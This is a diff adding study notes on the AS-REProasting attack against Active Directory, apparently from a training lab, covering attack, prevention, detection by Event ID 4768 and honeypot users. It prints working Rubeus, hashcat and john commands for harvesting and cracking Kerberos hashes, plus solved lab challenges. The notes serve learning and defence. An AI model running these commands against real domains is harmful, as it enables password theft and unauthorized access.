@@ -124,10 +124,49 @@
     - Voila, Felicitations! C'est fini!
 
 # AS-REProasting
+- Similar to Kerberoasting Attack
+    - `Do not require Kerberos preauthentication` property should be enabled
+    - Goal >> to get **crackable hashes**
+
+## Attack:
+- Tool >> `Rubeus`  with action: `asreproast`
+    - `.\Rubeus.exe asreproast /outfile:asrep.txt`
+    - `we need to edit it by adding 23$ after $krb5asrep$` in the obtained hash
+- Brute Forcing:
+    - `hashcat -m 18200 -a 0 asrep.txt passwords.txt --outfile asrepcrack.txt --force`
+
+## Prevention:
+- The success of this attack depends on **the strength of the password of users with Do not require Kerberos preauthentication configured**
 
 
+## Detection:
+- `Rubeus` leaves trace: **Event with ID 4768** >> (Kerberos Authentication ticket)
 
 
+## Honeypot User:
+- a user with no real use/need in the environment,
+- no login attempts are performed regularly >> any attempt(s) to perform a login for this account is likely malicious and requires inspection
+- **the only account with Kerberos Pre-Authentication not required.** >> not natural >> suspicious for the attackers >> so that avoid it
+
+
+## Practical Challenges:
+    1. Connect to the target and perform an AS-REProasting attack. What is the password for the user anni?
+
+    **Solved:**
+    - Using the `Rubeus` tool >>
+    - I obtained the user's hashes with the vulnerable property: "Do not Require Kerberos Authentication"
+    - Later then, using `john ripper` offline cracker I obtained the password
+        - `john --format=krb5asrep hashes.txt --pot=results.txt`
+    - It worked out >> Voila, c'est fini!
+
+    2. After performing the AS-REProasting attack, connect to DC1 (Domain Controller 1), and look at the logs in Event Viewer.
+       What is the TargetSid of the svc-iam user?
+
+    **Solved:**
+    - After the attack, as a defender I started to investigate the attack
+    - Tool >> Event Viewer >> ID 4768 >> since `Kerberos Authentication Ticket` is requested.
+    - Based on the timeline, I see that the associated user account with this Event ID
+    - Voila >> J'ai obtenu le drapeau
 
 
 
